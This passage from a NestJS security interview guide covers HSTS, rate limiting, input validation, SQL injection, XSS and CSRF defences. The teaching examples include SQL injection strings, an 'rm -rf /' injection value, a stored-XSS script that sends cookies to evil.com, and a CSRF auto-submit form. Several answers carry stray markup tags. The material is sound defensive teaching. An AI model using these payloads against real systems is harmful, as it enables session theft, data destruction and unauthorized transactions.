    preload: true, // Include in browser preload lists
  },
}));

// What HSTS Does:
// 1. User types: http://example.com
// 2. Browser sees HSTS header from previous visit
// 3. Browser auto-upgrades to: https://example.com
// 4. No insecure HTTP request sent

// Attack Prevention:
// ❌ Without HSTS: Attacker can intercept first HTTP request
// ✅ With HSTS: All requests forced to HTTPS
```

**Interview Tip**: HSTS forces HTTPS-only connections for specified duration (typically 1 year). Prevents protocol downgrade and MITM attacks. Browser auto-upgrades http:// to https://. Essential production security with `includeSubDomains` and `preload`.

</details>

## Rate Limiting

21. Why is rate limiting important for security?

<details>
<summary><strong>Answer</strong></summary>

**Rate Limiting**: Restricts number of requests per time period. **Security**: Prevents **brute force attacks**, **DDoS**, **API abuse**, **credential stuffing**. **Protection**: Limits login attempts (prevent password guessing), API calls (prevent scraping), resource consumption. **Implementation**: `@nestjs/throttler` package. **Production**: Essential defense layer - 10 login/min, 100 API/min typical limits.

```typescript
// Rate Limiting Security

// npm install @nestjs/throttler

import { ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot([{
      ttl: 60000, // 60 seconds
      limit: 100, // 100 requests per 60 seconds
    }]),
  ],
})
export class AppModule {}

// Security Benefits:
// 1. Brute Force Prevention: Limit login attempts
// 2. DDoS Protection: Prevent overwhelming server
// 3. API Abuse Prevention: Stop scraping/crawling
// 4. Cost Control: Prevent excessive API usage
```

**Interview Tip**: Prevents brute force (password guessing), DDoS, API abuse. Limits requests per time window. Essential for login endpoints (10/min) and APIs (100/min).

</details>

22. How do you implement rate limiting using `@nestjs/throttler`?

<details>
<summary><strong>Answer</strong></summary>

**Implementation**: Install `@nestjs/throttler`, configure `ThrottlerModule.forRoot()`, apply `ThrottlerGuard` globally or per-route. **Configuration**: Set `ttl` (time window) and `limit` (max requests). **Usage**: `@UseGuards(ThrottlerGuard)` or `@Throttle()` decorator. **Custom**: Per-route limits with `@Throttle({ default: { limit: 10, ttl: 60000 } })`. **Production**: Global guard + stricter limits for sensitive endpoints.

```typescript
// @nestjs/throttler Implementation

// 1. Install
// npm install @nestjs/throttler

// 2. Module Configuration
import { ThrottlerModule, ThrottlerGuard } from '@nestjs/throttler';
import { APP_GUARD } from '@nestjs/core';

@Module({
  imports: [
    ThrottlerModule.forRoot([{
      ttl: 60000, // 60 seconds
      limit: 100, // 100 requests
    }]),
  ],
  providers: [
    {
      provide: APP_GUARD,
      useClass: ThrottlerGuard, // Apply globally
    },
  ],
})
export class AppModule {}

// 3. Per-Route Limits
import { Throttle } from '@nestjs/throttler';

@Controller('auth')
export class AuthController {
  @Post('login')
  @Throttle({ default: { limit: 10, ttl: 60000 } }) // 10 per minute
  login() {}
  
  @Get('profile')
  @Throttle({ default: { limit: 100, ttl: 60000 } }) // 100 per minute
  profile() {}
}
```

**Interview Tip**: Install package, configure module with ttl/limit, apply `ThrottlerGuard` globally. Use `@Throttle()` for custom per-route limits. Typical: 100 general, 10 login.

</details>

23. How do you prevent brute force attacks on login endpoints?

<details>
<summary><strong>Answer</strong></summary>

**Brute Force Prevention**: **Rate limiting** (5-10 login/min), **account lockout** (5 failed attempts), **CAPTCHA** (after failures), **IP blocking**, **login delay** (increase wait time). **Implementation**: @nestjs/throttler + failed attempt tracking + temporary locks. **Security**: Combine multiple layers. **Production**: Monitor failed attempts, alert on suspicious patterns.

```typescript
// Brute Force Prevention

@Controller('auth')
export class AuthController {
  @Post('login')
  @Throttle({ default: { limit: 5, ttl: 60000 } }) // 5 attempts per minute
  async login(@Body() dto: LoginDto) {
    const user = await this.authService.findUser(dto.email);
    
    // Check if account locked
    if (user.lockedUntil && user.lockedUntil > new Date()) {
      throw new UnauthorizedException('Account locked. Try again later.');
    }
    
    // Validate password
    const valid = await user.validatePassword(dto.password);
    
    if (!valid) {
      // Increment failed attempts
      await this.authService.incrementFailedAttempts(user.id);
      
      // Lock account after 5 failures
      if (user.loginAttempts >= 4) {
        await this.authService.lockAccount(user.id, 15); // 15 minutes
      }
      
      throw new UnauthorizedException('Invalid credentials');
    }
    
    // Reset attempts on success
    await this.authService.resetFailedAttempts(user.id);
    return this.authService.login(user);
  }
}
```

**Interview Tip**: Combine rate limiting (5-10/min), account lockout (5 failures = 15min lock), CAPTCHA, IP blocking. Track failed attempts in DB, reset on success.

</details>

24. How do you implement API rate limiting per user/IP?

<details>
<summary><strong>Answer</strong></summary>

**Per-User/IP Limiting**: Track requests by **user ID** (authenticated) or **IP address** (anonymous). **Implementation**: Custom throttler with Redis/memory store, key by user/IP. **Strategy**: Different limits per user tier (free: 100/hour, premium: 10000/hour). **Headers**: Return `X-RateLimit-Remaining`, `X-RateLimit-Reset`. **Production**: Use Redis for distributed systems.

```typescript
// Per-User/IP Rate Limiting

@Injectable()
export class CustomThrottlerGuard extends ThrottlerGuard {
  protected async getTracker(req: Request): Promise<string> {
    // Authenticated: limit by user ID
    if (req.user) {
      return `user:${req.user.id}`;
    }
    
    // Anonymous: limit by IP
    return `ip:${req.ip}`;
  }
  
  protected async getLimit(context: ExecutionContext): Promise<number> {
    const req = context.switchToHttp().getRequest();
    
    // Different limits by user tier
    if (req.user?.tier === 'premium') {
      return 10000; // Premium: 10k per hour
    }
    
    return 100; // Free/Anonymous: 100 per hour
  }
}
```

**Interview Tip**: Track by user ID (authenticated) or IP (anonymous). Different limits per tier. Use Redis for distributed systems. Return rate limit headers.

</details>

## Input Validation

25. Why is input validation critical for security?

<details>
<summary><strong>Answer</strong></summary>

**Input Validation**: **First line of defense** against injection attacks. **Prevents**: SQL injection, XSS, command injection, path traversal, NoSQL injection. **Principle**: **Never trust user input**. **Implementation**: ValidationPipe + class-validator decorators. **Security**: Validate type, format, length, whitelist allowed properties. **Production**: Essential - validate ALL user input.

```typescript
// Input Validation Security

// Without Validation (VULNERABLE):
@Post()
create(@Body() data: any) {
  // ❌ Dangerous: accepts any data
  return this.db.query(`INSERT INTO users VALUES ('${data.name}')`);
  // SQL Injection: data.name = "'; DROP TABLE users; --"
}

// With Validation (SECURE):
import { IsString, IsEmail, Length } from 'class-validator';

export class CreateUserDto {
  @IsString()
  @Length(2, 50)
  name: string;
  
  @IsEmail()
  email: string;
}

@Post()
@UsePipes(new ValidationPipe({ whitelist: true }))
create(@Body() data: CreateUserDto) {
  // ✅ Validated: only accepts valid data
  return this.usersService.create(data);
}
```

**Interview Tip**: First defense against injection attacks (SQL, XSS, NoSQL). Never trust user input. Validate type, format, length with ValidationPipe + class-validator. Essential security layer.

</details>

26. How do you use ValidationPipe for input validation?

<details>
<summary><strong>Answer</strong></summary>

**ValidationPipe**: NestJS pipe that validates request data using **class-validator** decorators. **Usage**: Apply globally (`app.useGlobalPipes()`) or per-route. **Options**: `whitelist` (strip unknown properties), `forbidNonWhitelisted` (reject unknown), `transform` (convert types). **DTOs**: Define with decorators (@IsString, @IsEmail, @Min, @Max). **Production**: Always enable globally with whitelist=true.

```typescript
// ValidationPipe Usage

// 1. Global Configuration (main.ts)
import { ValidationPipe } from '@nestjs/common';

app.useGlobalPipes(new ValidationPipe({
  whitelist: true, // Strip unknown properties
  forbidNonWhitelisted: true, // Reject if unknown properties
  transform: true, // Transform to DTO types
}));

// 2. DTO with Validators
import { IsString, IsEmail, Min, Max, Length } from 'class-validator';

export class CreateUserDto {
  @IsString()
  @Length(2, 50)
  name: string;
  
  @IsEmail()
  email: string;
  
  @Min(18)
  @Max(120)
  age: number;
}

// 3. Controller Usage
@Post()
create(@Body() dto: CreateUserDto) {
  // Automatically validated
  return this.usersService.create(dto);
}
```

**Interview Tip**: Apply globally with `app.useGlobalPipes(new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true }))`. Define DTOs with class-validator decorators. Essential for security.

</details>

27. What is `class-validator` and how does it prevent injection attacks?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**class-validator Prevention**: Validates input **type**, **format**, **pattern** before reaching business logic. **Prevents**: SQL injection (validate strings), XSS (limit length/chars), NoSQL injection (strict types), command injection (whitelist format). **Decorators**: @IsString(), @IsEmail(), @Matches(), @IsEnum(). **Security**: Reject malicious input early. **Production**: Combine with sanitization for defense in depth.

```typescript
// class-validator for Injection Prevention

export class CreateProductDto {
  @IsString()
  @Length(2, 100)
  @Matches(/^[a-zA-Z0-9\s-]+$/) // Only alphanumeric, space, hyphen
  name: string; // Prevents SQL/XSS special chars
  
  @IsNumber()
  @Min(0)
  @Max(1000000)
  price: number; // Prevents type confusion attacks
  
  @IsEnum(['active', 'inactive'])
  status: string; // Prevents command injection
  
  @IsUUID()
  categoryId: string; // Strict format
}

// Prevents:
// 1. SQL Injection: name = "'; DROP TABLE products; --"
// 2. XSS: name = "<script>alert('xss')</script>"
// 3. NoSQL Injection: price = { $gt: 0 }
// 4. Command Injection: status = "; rm -rf /"
```

**Interview Tip**: Validates type, format, pattern before business logic. Prevents SQL/XSS/NoSQL injection by rejecting malicious input early. Use @Matches() for strict patterns, @IsEnum() for whitelists.

</details>

28. How do you sanitize user inputs?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**Sanitization**: **Clean** user input by removing/escaping dangerous characters. **Methods**: Strip HTML tags, escape SQL special chars, trim whitespace, normalize Unicode. **Libraries**: `DOMPurify` (HTML), `validator.js` (escape), custom transformers. **NestJS**: Use `@Transform()` decorator with sanitization functions. **Security**: Sanitize AFTER validation, before storage/use. **Production**: Essential for user-generated content.

```typescript
// Input Sanitization

import { Transform } from 'class-transformer';
import validator from 'validator';

export class CreatePostDto {
  @IsString()
  @Transform(({ value }) => validator.escape(value)) // Escape HTML entities
  @Transform(({ value }) => value.trim()) // Remove whitespace
  title: string;
  
  @IsString()
  @Transform(({ value }) => sanitizeHtml(value)) // Strip dangerous HTML
  content: string;
}

// Custom Sanitizer
import * as DOMPurify from 'isomorphic-dompurify';

function sanitizeHtml(dirty: string): string {
  // Allow only safe tags
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: [],
  });
}

// Usage
@Post()
create(@Body() dto: CreatePostDto) {
  // dto.title and dto.content are sanitized
  return this.postsService.create(dto);
}
```

**Interview Tip**: Clean input by removing dangerous chars. Use `validator.escape()` for HTML entities, DOMPurify for HTML sanitization. Apply with @Transform() decorator. Sanitize AFTER validation.

</details>

29. What is the `whitelist` option in ValidationPipe?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**whitelist Option**: **Automatically strips** properties not defined in DTO. **Security**: Prevents **mass assignment** attacks (users adding unauthorized fields like `isAdmin`). **Behavior**: Silently removes unknown properties. **Best Practice**: Always enable in production. **Combine**: Use with `forbidNonWhitelisted` to reject instead of strip.

```typescript
// whitelist Option

// DTO Definition
export class UpdateUserDto {
  @IsString()
  name?: string;
  
  @IsEmail()
  email?: string;
  
  // isAdmin NOT defined
}

// Without whitelist (VULNERABLE):
app.useGlobalPipes(new ValidationPipe({
  whitelist: false, // ❌ Dangerous
}));

// Malicious Request:
PUT /users/1
{
  "name": "John",
  "isAdmin": true // ❌ Accepted! Mass assignment attack
}

// With whitelist (SECURE):
app.useGlobalPipes(new ValidationPipe({
  whitelist: true, // ✅ Strips unknown properties
}));

// Malicious Request:
PUT /users/1
{
  "name": "John",
  "isAdmin": true // ✅ Stripped! Only { name: "John" } reaches controller
}
```

**Interview Tip**: Strips properties not in DTO. Prevents mass assignment (unauthorized fields like `isAdmin`). Always enable: `whitelist: true`. Silently removes unknown properties for security.

</details>

30. What is `forbidNonWhitelisted` option?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**forbidNonWhitelisted**: **Rejects** requests with unknown properties instead of stripping. **Security**: Stricter than `whitelist` - alerts client to invalid data. **Behavior**: Throws `400 Bad Request` if unknown properties found. **Use Case**: Strict APIs, detect malicious attempts. **Production**: Enable for sensitive endpoints. **Requires**: `whitelist: true` must also be enabled.

```typescript
// forbidNonWhitelisted Option

app.useGlobalPipes(new ValidationPipe({
  whitelist: true, // Required
  forbidNonWhitelisted: true, // Reject unknown properties
}));

// DTO
export class UpdateUserDto {
  @IsString()
  name?: string;
  
  @IsEmail()
  email?: string;
}

// Malicious Request:
PUT /users/1
{
  "name": "John",
  "isAdmin": true // Unknown property
}

// Response: 400 Bad Request
{
  "statusCode": 400,
  "message": [
    "property isAdmin should not exist"
  ],
  "error": "Bad Request"
}
```

**Interview Tip**: Rejects requests with unknown properties (vs whitelist which strips). Stricter security - alerts client to invalid data. Requires `whitelist: true`. Use for sensitive APIs to detect attacks.

</details>

## SQL Injection Prevention

31. What is SQL injection?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**SQL Injection**: **Attack** where malicious SQL code injected into queries via user input. **Mechanism**: Unsanitized input breaks query syntax, executes arbitrary SQL. **Impact**: Data breach, deletion, authentication bypass, privilege escalation. **Example**: `' OR '1'='1` bypasses login. **Prevention**: Parameterized queries, ORM, input validation. **OWASP**: #3 in Top 10 vulnerabilities.

```typescript
// SQL Injection Attack

// VULNERABLE Code:
@Post('login')
async login(@Body() dto: LoginDto) {
  // ❌ Dangerous: String concatenation
  const query = `SELECT * FROM users WHERE email = '${dto.email}' AND password = '${dto.password}'`;
  const user = await this.db.query(query);
}

// Attack:
POST /login
{
  "email": "admin@example.com",
  "password": "' OR '1'='1"
}

// Executed Query:
SELECT * FROM users WHERE email = 'admin@example.com' AND password = '' OR '1'='1'
// '1'='1' is always true → bypasses authentication!

// More Dangerous Attacks:
{
  "password": "'; DROP TABLE users; --" // Deletes table
}
{
  "email": "' UNION SELECT * FROM credit_cards; --" // Steals data
}
```

**Interview Tip**: Inject malicious SQL via user input. Breaks query syntax with special chars (', --, ;). Bypasses auth, steals data, deletes tables. Prevented by parameterized queries, ORMs.

</details>

32. How does TypeORM prevent SQL injection?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**TypeORM Prevention**: Automatically uses **parameterized queries** (prepared statements). **Mechanism**: User input passed as parameters, not concatenated into SQL. **Safety**: Database escapes special chars, treats input as data not code. **Methods**: `find()`, `findOne()`, `save()`, query builder. **Security**: Use ORM methods instead of raw queries. **Production**: Prefer entity methods over raw SQL.

```typescript
// TypeORM Prevents SQL Injection

// SECURE: TypeORM Methods
@Injectable()
export class UsersService {
  // ✅ Safe: Parameterized
  async findByEmail(email: string) {
    return this.userRepository.findOne({ where: { email } });
    // Generated: SELECT * FROM users WHERE email = ? (email passed as parameter)
  }
  
  // ✅ Safe: Query Builder
  async findByEmailAndRole(email: string, role: string) {
    return this.userRepository
      .createQueryBuilder('user')
      .where('user.email = :email', { email }) // Parameterized
      .andWhere('user.role = :role', { role }) // Parameterized
      .getOne();
  }
  
  // ⚠️ VULNERABLE: Raw Query (avoid)
  async unsafeFind(email: string) {
    return this.userRepository.query(
      `SELECT * FROM users WHERE email = '${email}'` // ❌ Injection risk
    );
  }
}
```

**Interview Tip**: Uses parameterized queries automatically. Input passed as parameters, not concatenated. Database escapes special chars. Use `find()`, query builder instead of raw SQL.

</details>

33. Should you use raw queries or ORM methods?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**Raw Queries**: Direct SQL strings, **manual escaping** required, **injection risk** if not careful. **ORM**: Object-oriented interface, **automatic parameterization**, **type-safe**, less injection risk. **Performance**: Raw faster for complex queries, ORM easier/safer. **Security**: ORM preferred (automatic protection). **Use Raw**: Only when needed, always parameterize. **Production**: Default to ORM, use raw sparingly with parameters.

```typescript
// Raw Queries vs ORM

// 1. RAW QUERY (Risky if not parameterized)
@Injectable()
export class UsersService {
  // ❌ VULNERABLE:
  async unsafeRaw(email: string) {
    return this.dataSource.query(
      `SELECT * FROM users WHERE email = '${email}'` // Injection risk
    );
  }
  
  // ✅ SAFE: Parameterized Raw
  async safeRaw(email: string) {
    return this.dataSource.query(
      'SELECT * FROM users WHERE email = $1', // PostgreSQL
      [email] // Parameter
    );
  }
}

// 2. ORM (Secure by default)
@Injectable()
export class UsersService {
  // ✅ Automatic parameterization
  async ormFind(email: string) {
    return this.userRepository.findOne({ where: { email } });
  }
  
  // ✅ Query builder (type-safe)
  async ormQueryBuilder(email: string) {
    return this.userRepository
      .createQueryBuilder()
      .where('email = :email', { email })
      .getOne();
  }
}
```

**Interview Tip**: Raw = manual escaping, injection risk if not parameterized. ORM = automatic parameterization, type-safe, safer. Prefer ORM for security. Use raw only when needed, always parameterize.

</details>

34. How do you parameterize queries?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**Parameterization**: Separate **SQL structure** from **user data**. **Method**: Use placeholders (`?`, `$1`, `:param`) instead of string concatenation. **Security**: Database treats parameters as data, not code. **TypeORM**: Pass parameters object to query builder (`:paramName`), array to raw queries (`$1`). **Rule**: NEVER concatenate user input into SQL strings. **Production**: Always parameterize, even for trusted input.

```typescript
// Proper Query Parameterization

// ❌ WRONG: String Concatenation
async vulnerable(email: string, role: string) {
  return this.dataSource.query(
    `SELECT * FROM users WHERE email = '${email}' AND role = '${role}'`
  );
}

// ✅ CORRECT: TypeORM Query Builder
async secure1(email: string, role: string) {
  return this.userRepository
    .createQueryBuilder('user')
    .where('user.email = :email', { email }) // Named parameter
    .andWhere('user.role = :role', { role }) // Named parameter
    .getOne();
}

// ✅ CORRECT: Raw Query with Parameters (PostgreSQL)
async secure2(email: string, role: string) {
  return this.dataSource.query(
    'SELECT * FROM users WHERE email = $1 AND role = $2', // Positional placeholders
    [email, role] // Parameters array
  );
}

// ✅ CORRECT: Raw Query with Parameters (MySQL)
async secure3(email: string, role: string) {
  return this.dataSource.query(
    'SELECT * FROM users WHERE email = ? AND role = ?', // Question mark placeholders
    [email, role] // Parameters array
  );
}
```

**Interview Tip**: Use placeholders (`:param`, `$1`, `?`) instead of concatenation. Pass parameters separately. Database treats as data, not code. TypeORM query builder automatically parameterizes.

</details>

## XSS (Cross-Site Scripting) Prevention

35. What is XSS attack?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**XSS**: Inject **malicious JavaScript** into web pages viewed by other users. **Types**: **Reflected** (URL), **Stored** (database), **DOM-based** (client-side). **Impact**: Session hijacking, cookie theft, defacement, phishing. **Example**: `<script>steal(document.cookie)</script>` in comment. **Prevention**: Output encoding, CSP, input validation, HTTPOnly cookies. **OWASP**: #7 in Top 10 vulnerabilities.

```typescript
// XSS Attack Examples

// 1. STORED XSS (Most Dangerous)
// Attacker posts comment:
POST /comments
{
  "text": "<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>"
}

// Victim views page:
GET /comments
// Response contains malicious script → executes in victim's browser
// Steals victim's session cookie!

// 2. REFLECTED XSS
// Attacker sends link:
https://example.com/search?q=<script>alert(document.cookie)</script>

// Server reflects input in response:
<h1>Search results for: <script>alert(document.cookie)</script></h1>
// Script executes in victim's browser!

// 3. DOM-BASED XSS
// Vulnerable frontend code:
document.getElementById('welcome').innerHTML = 
  'Hello ' + window.location.hash.substring(1);

// Attack URL:
https://example.com#<img src=x onerror=alert(document.cookie)>
```

**Interview Tip**: Inject JavaScript into pages viewed by others. Types: Reflected (URL), Stored (DB), DOM-based. Steals cookies/sessions. Prevented by output encoding, CSP, HTTPOnly cookies, input validation.

</details>

36. How do you prevent XSS in NestJS?

<details>
<parameter name="summary"><strong>Answer</strong></summary>

**NestJS XSS Prevention**: **Input validation** (ValidationPipe), **output encoding** (frontend framework auto-escapes), **sanitization** (DOMPurify), **CSP** (Content Security Policy), **HTTPOnly cookies**, **X-XSS-Protection header**. **Backend**: Validate input, sanitize HTML. **Frontend**: Use React/Angular auto-escaping, avoid `innerHTML`. **Headers**: Set CSP, X-Content-Type-Options. **Production**: Defense in depth - multiple layers.

```typescript
// XSS Prevention in NestJS

// 1. Input Validation
import { IsString, Length } from 'class-validator';
import { Transform } from 'class-transformer';
import * as DOMPurify from 'isomorphic-dompurify';

export class CreateCommentDto {
  @IsString()
  @Length(1, 500)
  @Transform(({ value }) => DOMPurify.sanitize(value)) // Remove scripts
  text: string;
}

// 2. Security Headers (main.ts)
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // Block inline scripts
    },
  },
  xssFilter: true, // X-XSS-Protection header
}));

// 3. HTTPOnly Cookies (prevents JS access)
@Controller('auth')
export class AuthController {
  @Post('login')
  async login(@Res() res: Response) {
    res.cookie('token', jwt, {
      httpOnly: true, // Not accessible via JavaScript
      secure: true,
      sameSite: 'strict',
    });
  }
}

// 4. Output Encoding (Frontend)
// React/Angular auto-escape by default:
// <div>{userInput}</div> → Safe
// <div dangerouslySetInnerHTML={{__html: userInput}}> → Unsafe
```

**Interview Tip**: Backend: validate input, sanitize HTML (DOMPurify). Headers: CSP, X-XSS-Protection. Cookies: HTTPOnly. Frontend: use framework auto-escaping, avoid innerHTML. Defense in depth.

</details>

37. Should you escape user-generated content?

<details>
<summary><strong>Answer</strong></summary>

**Output Escaping**: **Yes**, always escape before displaying. **Purpose**: Convert special HTML chars (`<`, `>`, `&`, `"`, `'`) to entities (`&lt;`, `&gt;`). **Context**: Necessary when displaying user input. **Frontend**: React/Angular auto-escape by default. **Backend**: Use template engines with auto-escaping, or libraries like `he` or `DOMPurify`. **Rule**: Never render raw HTML from users. **Production**: Escape at output, not storage (preserve original data).

```typescript
// Output Escaping

// 1. Frontend (React auto-escapes):
function Comment({ text }) {
  // ✅ Safe: React escapes by default
  return <div>{text}</div>;
  // Input: <script>alert('xss')</script>
  // Output: &lt;script&gt;alert('xss')&lt;/script&gt;
  
  // ❌ Unsafe: Bypasses escaping
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// 2. Backend Escaping (if returning HTML)
import * as he from 'he';

@Get('comments')
async getComments() {
  const comments = await this.commentsService.findAll();
  
  return comments.map(comment => ({
    ...comment,
    text: he.escape(comment.text), // Escape HTML entities
  }));
}

// 3. Template Engines (Handlebars)
// ✅ Safe: {{text}} auto-escapes
<div>{{text}}</div>

// ❌ Unsafe: {{{text}}} renders raw HTML
<div>{{{text}}}</div>
```

**Interview Tip**: Always escape before display. Converts `<script>` to `&lt;script&gt;`. React/Angular auto-escape by default. Never use `dangerouslySetInnerHTML` or `innerHTML` with user content.

</details>

38. How do you sanitize HTML inputs?

<details>
<summary><strong>Answer</strong></summary>

**HTML Sanitization**: **Remove** or **escape** dangerous HTML/JavaScript while preserving safe formatting. **Use Case**: Rich text editors, markdown, blog posts. **Libraries**: `DOMPurify` (best), `sanitize-html`, `xss`. **Strategy**: Whitelist safe tags/attributes, strip everything else. **NestJS**: Use @Transform() with sanitizer function. **Production**: Sanitize before storage AND before display.

```typescript
// HTML Sanitization

// npm install isomorphic-dompurify
import * as DOMPurify from 'isomorphic-dompurify';

// 1. Basic Sanitization
export class CreateArticleDto {
  @IsString()
  @Transform(({ value }) => DOMPurify.sanitize(value))
  content: string;
}

// Input:
{
  "content": "<p>Hello</p><script>alert('xss')</script><img src=x onerror=alert(1)>"
}

// Output:
{
  "content": "<p>Hello</p>" // Scripts removed
}

// 2. Whitelist Approach (Strict)
function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href'], // Only for <a> tags
    ALLOWED_URI_REGEXP: /^https?:\/\//, // Only http/https links
  });
}

// 3. Custom Sanitizer Service
@Injectable()
export class SanitizerService {
  sanitizeArticle(html: string): string {
    return DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['h1', 'h2', 'p', 'strong', 'em', 'a'],
      ALLOWED_ATTR: ['href', 'title'],
    });
  }
}
```

**Interview Tip**: Use DOMPurify to remove dangerous HTML. Whitelist safe tags (p, strong, em), strip scripts/events. Apply with @Transform() decorator. Sanitize before storage AND display.

</details>

## CSRF (Cross-Site Request Forgery) Prevention

39. What is CSRF attack?

<details>
<summary><strong>Answer</strong></summary>

**CSRF**: **Trick** authenticated user into unknowingly executing actions. **Mechanism**: Attacker creates malicious link/form, user's browser automatically sends cookies with request. **Impact**: Unauthorized transfers, password changes, data deletion. **Example**: `<img src="bank.com/transfer?to=attacker&amount=1000">`. **Prevention**: CSRF tokens, SameSite cookies, Origin/Referer validation. **OWASP**: Significant threat for state-changing operations.

```typescript
// CSRF Attack Example

// Scenario: User logged into banking site (session cookie stored)

// Attacker's malicious site:
<html>
  <body>
    <!-- Hidden form auto-submits -->
    <form action="https://bank.com/transfer" method="POST" id="hack">
      <input name="to" value="attacker" />
      <input name="amount" value="10000" />
    </form>
    <script>document.getElementById('hack').submit();</script>
  </body>
</html>

// When victim visits attacker's site:
// 1. Form submits to bank.com
// 2. Browser automatically includes session cookie
// 3. Bank sees valid session → processes transfer!
// 4. Victim loses $10,000

// Another Example (GET request):
// Attacker sends email with:
<img src="https://bank.com/delete-account" />
// User loads email → account deleted!
```

**Interview Tip**: Tricks authenticated user into unwanted actions. Browser auto-sends cookies with requests. Prevented by CSRF tokens (verify request origin), SameSite cookies. Critical for POST/PUT/DELETE.

</details>

40. How do you prevent CSRF attacks?

<details>
<summary><strong>Answer</strong></summary>

**CSRF Prevention**: **CSRF tokens** (verify origin), **SameSite cookies** (block cross-site), **Origin/Referer validation**, **Custom headers** (AJAX only). **Strategy**: Combine multiple defenses. **NestJS**: Use `csurf` middleware, set SameSite='strict'. **Best Practice**: CSRF tokens for forms, SameSite for APIs. **Production**: Essential for state-changing operations (POST/PUT/DELETE).

```typescript
// CSRF Prevention Strategies

// 1. SameSite Cookies (Primary Defense)
@Controller('auth')
export class AuthController {
  @Post('login')
  login(@Res() res: Response) {
    res.cookie('session', token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict', // ✅ Blocks cross-site requests
    });
  }
}

// 2. CSRF Tokens (Double-Submit Pattern)
// main.ts
import * as csurf from 'csurf';

app.use(csurf({
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
  },
}));

// Frontend must include token:
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
</form>

// 3. Origin/Referer Validation
@Injectable()
export class CsrfGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const req = context.switchToHttp().getRequest();
    const origin = req.get('Origin');
    const referer = req.get('Referer');
    
    const allowedOrigins = ['https://example.com'];
    return allowedOrigins.some(allowed => 
      origin?.startsWith(allowed) || referer?.startsWith(allowed)
    );
  }
}

// 4. Custom Headers (AJAX)
@UseGuards(CsrfHeaderGuard)
@Post('api/data')
async apiEndpoint() {}

// Frontend:
fetch('/api/data', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest', // Custom header
  },
});
```

**Interview Tip**: Combine SameSite cookies (block cross-site) + CSRF tokens (verify origin) + Origin validation. SameSite='strict' for APIs, tokens for forms. Essential for POST/PUT/DELETE.

</details>

41. What is the CSRF token pattern?

<details>
<summary><strong>Answer</strong></summary>

**CSRF Token Pattern**: **Server generates unique token** per session/request, **embeds in forms**, **validates on submission**. **Types**: **Synchronizer token** (session-based), **Double-submit cookie** (stateless). **Mechanism**: Attacker can't access token (same-origin policy). **Validation**: Token must match server-side value. **NestJS**: Use `csurf` middleware. **Production**: Tokens for forms, refresh periodically.

```typescript
// CSRF Token Pattern

// 1. Synchronizer Token (Session-based)
// Server generates token, stores in session
@Controller()
export class AppController {
  @Get('form')
  @Render('form')
  getForm(@Req() req: Request) {
    // Token generated by csurf middleware
    return { csrfToken: req.csrfToken() };
  }
  
  @Post('submit')
  submit(@Body() data: any) {
    // csurf middleware validates token
    // If invalid → 403 Forbidden
    return 'Success';
  }
}

// Frontend (form.hbs):
<form method="POST" action="/submit">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <input name="data" />
  <button>Submit</button>
</form>

// 2. Double-Submit Cookie (Stateless)
@Injectable()
export class CsrfService {
  generateToken(): string {
    return crypto.randomBytes(32).toString('hex');
  }
  
  validateToken(req: Request): boolean {
    const cookieToken = req.cookies['csrf-token'];
    const headerToken = req.get('X-CSRF-Token');
    return cookieToken === headerToken; // Must match
  }
}

// Response sets cookie + returns token:
res.cookie('csrf-token', token, { sameSite: 'strict' });
// Frontend sends token in header:
headers: { 'X-CSRF-Token': token }
```

**Interview Tip**: Server generates unique token, embeds in forms, validates on submit. Attacker can't access (same-origin). Types: Synchronizer (session) or Double-submit (cookie). Use `csurf` middleware.

</details>

42. How do you implement CSRF protection using `csurf` middleware?

<details>
<summary><strong>Answer</strong></summary>

**csurf Implementation**: Install `csurf`, configure middleware, generate tokens with `req.csrfToken()`, include in forms/headers. **Configuration**: Cookie-based or session-based storage. **Validation**: Automatic - middleware checks token on POST/PUT/DELETE. **Frontend**: Include token in `_csrf` field or `X-CSRF-Token` header. **Production**: Essential for traditional server-rendered apps.

```typescript
// csurf Middleware Implementation

// 1. Install
// npm install csurf cookie-parser

// 2. Configure (main.ts)
import * as cookieParser from 'cookie-parser';
import * as csurf from 'csurf';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  app.use(cookieParser());
  
  // Cookie-based CSRF
  app.use(csurf({
    cookie: {
      httpOnly: true,
      secure: true, // HTTPS only
      sameSite: 'strict',
    },
  }));
  
  await app.listen(3000);
}

// 3. Generate Token (Controller)
@Controller()
export class FormController {
  @Get('form')
  @Render('form')
  getForm(@Req() req: Request) {
    return {
      csrfToken: req.csrfToken(), // Generated by middleware
    };
  }
  
  @Post('submit')
  submitForm(@Body() data: any) {
    // csurf automatically validates token
    // If missing/invalid → 403 Forbidden
    return { message: 'Success' };
  }
}

// 4. Frontend (Traditional Form)
<form method="POST" action="/submit">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <input name="name" placeholder="Name" />
  <button>Submit</button>
</form>

// 5. Frontend (AJAX)
const csrfToken = document.querySelector('[name="_csrf"]').value;

